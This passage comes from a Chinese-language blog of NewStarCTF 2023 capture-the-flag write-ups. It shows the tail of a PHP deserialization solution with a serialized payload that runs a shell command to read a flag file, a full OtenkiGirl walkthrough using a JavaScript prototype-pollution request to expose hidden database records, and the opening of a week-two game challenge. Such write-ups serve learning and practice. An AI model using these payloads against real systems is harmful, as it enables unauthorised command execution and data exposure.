class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">$payload=&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;<br><br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:39:&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:39:&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231013111032145.png" alt="image-20231013111032145"></p><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>该题提供了网页的源码，我们可以从网页的源码中进行分析:<br><img src="/images/2023-11-3-newstar-3/image-20231028152657729.png" alt="image-20231028152657729"></p><p>源码中存在路由文件夹，先查看网页的具体运行逻辑是什么，即从网页的路由开始分析:</p><p>submit.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Base58</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;base-58&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ALPHABET</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">rndText</span> = (<span class="hljs-params">length</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(&#123; length &#125;, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable constant_">ALPHABET</span>[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable constant_">ALPHABET</span>.<span class="hljs-property">length</span>)]).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">timeText</span> = (<span class="hljs-params">timestamp</span>) =&gt; &#123;<br>    timestamp = (<span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">let</span> text1 = timestamp.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, timestamp.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">let</span> text2 = timestamp.<span class="hljs-title function_">substring</span>(timestamp.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">let</span> text = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; text1.<span class="hljs-property">length</span>; i++)<br>        text += text1[i] + text2[text2.<span class="hljs-property">length</span> - <span class="hljs-number">1</span> - i];<br>    <span class="hljs-keyword">if</span> (text2.<span class="hljs-property">length</span> &gt; text1.<span class="hljs-property">length</span>) text += text2[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Base58</span>.<span class="hljs-title function_">encode</span>(<span class="hljs-title function_">rndText</span>(<span class="hljs-number">3</span>) + <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(text)); <span class="hljs-comment">// length = 20</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">rndID</span> = (<span class="hljs-params">length, timestamp</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> t = <span class="hljs-title function_">timeText</span>(timestamp);<br>    <span class="hljs-keyword">if</span> (length &lt; t.<span class="hljs-property">length</span>) <span class="hljs-keyword">return</span> t.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, length);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> t + <span class="hljs-title function_">rndText</span>(length - t.<span class="hljs-property">length</span>);<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-keyword">let</span> date = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;date&quot;</span>]),<br>        place = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;place&quot;</span>]),<br>        contact = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;contact&quot;</span>]),<br>        reason = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;reason&quot;</span>]);<br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-keyword">const</span> wishid = <span class="hljs-title function_">rndID</span>(<span class="hljs-number">24</span>, timestamp);<br>    <span class="hljs-comment">//将用户输入的内容插入数据库中</span><br>    <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">run</span>(<span class="hljs-string">`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`</span>, [wishid, date, place, contact, reason, timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> &#123; wishid, date, place, contact, reason, timestamp &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">dst, src</span>) =&gt; &#123;<br>    <span class="hljs-comment">//在js中如果对象时json类型即const data=&#123;&#125;,则该data对象的类型就为object，否则就不是，返回dst所代表的值</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> dst !== <span class="hljs-string">&quot;object&quot;</span> || <span class="hljs-keyword">typeof</span> src !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> dst;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> src) &#123; <span class="hljs-comment">//获取src中的键</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> dst &amp;&amp; key <span class="hljs-keyword">in</span> src) &#123; <span class="hljs-comment">//如果键存在于两个对象中则进行合并</span><br>            <span class="hljs-comment">//将两个对象所对应的key的value进行合并，返回给dst对象</span><br>            dst[key] = <span class="hljs-title function_">merge</span>(dst[key], src[key]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//如果dst对象中不存在该键值，则添加上该键值</span><br>            dst[key] = src[key];<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//所以最终该代码添加上dst中没有src中有的键值内容给dst,保持两者都有的内容在dst中不变</span><br>    <span class="hljs-keyword">return</span> dst;<br>&#125;<br><br><span class="hljs-comment">//网页以post请求的方式访问/submit地址时,atx存储了请求和响应的信息</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/submit&quot;</span>, <span class="hljs-title function_">async</span>(ctx) =&gt; &#123;<br>    <span class="hljs-comment">//判断，传输类型是否是application/json</span><br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/json&quot;</span>)<br>    <span class="hljs-comment">//返回一个以json数据为格式的响应内容</span><br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/json&quot;</span><br>        &#125;<br>        <span class="hljs-comment">//获取请求体中的json主体内容</span><br>    <span class="hljs-keyword">const</span> jsonText = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">rawBody</span> || <span class="hljs-string">&quot;&#123;&#125;&quot;</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//将获取的数据转化为js所可以使用的json数据，可以理解为转化为字典类型的数据</span><br>        <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonText);<br>        <span class="hljs-comment">//判断json数据data中contact健所对应的value的类型以及reason所对应得类型是不是为string(字符串)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data[<span class="hljs-string">&quot;contact&quot;</span>] !== <span class="hljs-string">&quot;string&quot;</span> || <span class="hljs-keyword">typeof</span> data[<span class="hljs-string">&quot;reason&quot;</span>] !== <span class="hljs-string">&quot;string&quot;</span>)<br>        <span class="hljs-comment">//如果其中有一个传输类型不是字符串就输出错误的响应包</span><br>            <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//判断data中contact和reason所对应的内容的值是否为空</span><br>        <span class="hljs-keyword">if</span> (data[<span class="hljs-string">&quot;contact&quot;</span>].<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span> || data[<span class="hljs-string">&quot;reason&quot;</span>].<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-comment">//如果两者所对应得内容为空，则返回错误得响应内容主体</span><br>            <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Parameters contact and reason cannot be empty&quot;</span><br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT</span> = &#123;<br>                <span class="hljs-attr">date</span>: <span class="hljs-string">&quot;unknown&quot;</span>,<br>                <span class="hljs-attr">place</span>: <span class="hljs-string">&quot;unknown&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//调用insert2db函数将内容插入到数据库中</span><br>        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">merge</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-attr">data</span>: result<br>        &#125;;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>info.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-comment">//引用配置文件，可以使当前代码获取引用文件中的信息</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) &#123;<br>    <span class="hljs-comment">//如果timestamp类型为number型（数值型），则返回timestamp的值，否则就为当前时间的值</span><br>    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-comment">// Remove test data from before the movie was released</span><br>    <span class="hljs-comment">//获取时间戳信息，如果CONFIG.min_public_time的时间为真则以它作为对象申请时的参数</span><br>    <span class="hljs-comment">//否则就以DEFAULT_CONFIG.min_public_time作为时间对象的参数，gettime()获取date类的时间戳</span><br>    <span class="hljs-comment">//这里的CONFIG，DEFAULT_CONFIG都属于引用文件，所以获取的是引用的配置文件中的信息</span><br>    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<br>    <span class="hljs-comment">//timestamp获取timestamp和minTimestamp中最大的那一个时间戳的值</span><br>    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<br>    <span class="hljs-comment">//获取数据库中时间戳大于timestamp的记录内容</span><br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><span class="hljs-comment">//使用post请求访问/info网页，:表示访问该网页时获取参数内容,ts为参数部分，?表示该参数可以填写也可以不填写</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/info/:ts?&quot;</span>, <span class="hljs-title function_">async</span>(ctx) =&gt; &#123;<br>    <span class="hljs-comment">//判断请求内容得类型是不是application/x-www-form-urlencoded</span><br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//获取请求内容中的参数集中的参数ts的值的类型</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> === <span class="hljs-string">&quot;undefined&quot;</span>)<br>        ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> = <span class="hljs-number">0</span> <span class="hljs-comment">//ts参数默认是0</span><br>        <span class="hljs-comment">// /^[0-9]+$/.test(ctx.params.ts || &quot;&quot;):先运行test()中的内容，如果ts为空则被赋值为&quot;&quot;,同时判断是否由数字组成</span><br>        <span class="hljs-comment">//如果由数字组成的字符串则返回Number(ctx.params.ts)，将ts转化为数值型的结果</span><br>        <span class="hljs-comment">//如果不是由数字组成的字符串，则返回原来ts的内容</span><br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-regexp">/^[0-9]+$/</span>.<span class="hljs-title function_">test</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> || <span class="hljs-string">&quot;&quot;</span>) ? <span class="hljs-title class_">Number</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>) : ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>;<br>    <span class="hljs-comment">//如果timestamp类型不为数值型</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> timestamp !== <span class="hljs-string">&quot;number&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter ts&quot;</span><br>        &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getInfo</span>(timestamp).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-comment">//data为从数据库中返回的所有记录数内容</span><br>            <span class="hljs-attr">data</span>: data<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>根据info.js的代码审计我们需要查看config.js文件和config.default.js文件中的最小时间信息:</p><p>config.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>config.default.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>    <span class="hljs-comment">//设置了min_public_time参数的内容</span><br>    <span class="hljs-attr">min_public_time</span>: <span class="hljs-string">&quot;2019-07-09&quot;</span>,<br>    <span class="hljs-attr">server_port</span>: <span class="hljs-number">9960</span>,<br>    <span class="hljs-attr">webpack_dev_port</span>: <span class="hljs-number">9970</span><br>&#125;<br></code></pre></td></tr></table></figure><p>发现只有config.default.js设置了min_public_time参数的内容，所以date类申请时使用了config.default.js中的min_public_time: “2019-07-09”</p><p>同时根据分析info.js我们可以知道我们输入的参数ts可以时任意的，用于获取指定时间戳的信息:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028170204727.png" alt="image-20231028170204727"></p><p>我们发现返回的内容是时间戳”timestamp”:1698483502171的内容，这是因为我们输入的时间戳ts&#x3D;1&lt;1698483502171（min_public_time: “2019-07-09”）所以返回的是系统默认时间之上的信息</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/1698483502172<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028170420211.png" alt="image-20231028170420211"></p><p>发现没有data数据返回，这是因为我们输入的时间戳ts已经大于系统默认的时间戳，所以返回我们ts之上的data数据记录</p><p>猜测:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">当前数据库返回的内容是在系统配置的默认时间之上的信息，即由于代码的时间过滤，最多回显配置时间之上的信息，我们无法查看配置时间之下的数据库中的信息，也许flag就在配置时间之下的记录中，所以我们需要更改默认配置的时间，使其变得很小，这样我们就可以查看数据库中更多的信息<br></code></pre></td></tr></table></figure><p>js原型链污染:</p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable constant_">POST</span> /submit <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.</span>1Content-<span class="hljs-title class_">Type</span>: application/json<br><br>&#123;  <br>    <span class="hljs-string">&quot;contact&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,  <br>    <span class="hljs-string">&quot;reason&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,  <br>    <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;    <br>        <span class="hljs-string">&quot;min_public_time&quot;</span>: <span class="hljs-string">&quot;1001-01-01&quot;</span>  <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028171513867.png" alt="image-20231028171513867"></p><p>获取我们修改默认配置时间后数据库中的信息(0是最小的时间戳，所以一定能返回”min_public_time”: “1001-01-01”之上时间的信息):<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/0<br><br>Content-Type:  application/x-www-form-urlencoded<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028171757647.png" alt="image-20231028171757647"></p><p>返回了数据库中更多的信息，在这些额外的信息中查找flag:<br><img src="/images/2023-11-3-newstar-3/image-20231028171854336.png" alt="image-20231028171854336"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023_第二周WP</title>
    <link href="/2023/10/09/2023-10-9-newstarweek2/"/>
    <url>/2023/10/09/2023-10-9-newstarweek2/</url>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-第二周WP"><a href="#NewStarCTF-2023-第二周WP" class="headerlink" title="NewStarCTF 2023_第二周WP"></a>NewStarCTF 2023_第二周WP</h1><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004153201791.png" alt="image-20231004153201791"></p><p>本题是一道游戏题，按照惯例，我们需要先查看的js:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153237481.png" alt="image-20231004153237481"></p><p>得到一个app_v2.js文件，以及我们需要获得100000分才能显示flag</p><p>访问app_v2.js文件,我们直接定位到游戏结束时的处理代码:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153442164.png" alt="image-20231004153442164"></p><p>显示一个alert提示框，使用ctrl+f寻找该提示框的具体位置:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153543915.png" alt="image-20231004153543915"></p><p>在该代码中我们发现了api.php文件，对其进行访问:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004153645105.png" alt="image-20231004153645105"></p><p>对js代码进行代码审计:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//游戏结束</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<br>        <span class="hljs-comment">//创建了一个新的XMLHttpRequest对象。XMLHttpRequest对象是用于在后台与服务器交换数据的JavaScript API。它可以通过HTTP或HTTPS协议发送HTTP请求，并接收服务器的响应。</span><br>    